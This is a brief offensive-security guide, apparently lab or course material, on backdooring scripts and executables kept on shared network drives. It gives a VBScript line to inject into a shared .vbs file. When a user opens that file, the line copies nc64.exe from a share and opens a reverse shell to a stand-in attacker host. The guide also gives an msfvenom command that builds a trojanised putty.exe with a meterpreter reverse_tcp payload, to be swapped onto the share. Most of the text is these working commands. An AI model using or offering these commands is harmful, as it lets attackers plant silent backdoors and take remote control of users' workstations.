# Backdooring

### Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a 
copy of nc64.exe on the same share and inject the following code in the 
shared script:

```bash
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

### Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, you can 
download it from the share and use msfvenom to inject a backdoor into 
it. The binary will still work as usual but execute an additional 
payload silently. To create a backdoored putty.exe, we can use the 
following command:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp

payload 
without the user noticing it. Once the file has been generated, we can 
replace the executable on the windows share and wait for any connections
 using the exploit/multi/handler module from Metasploit.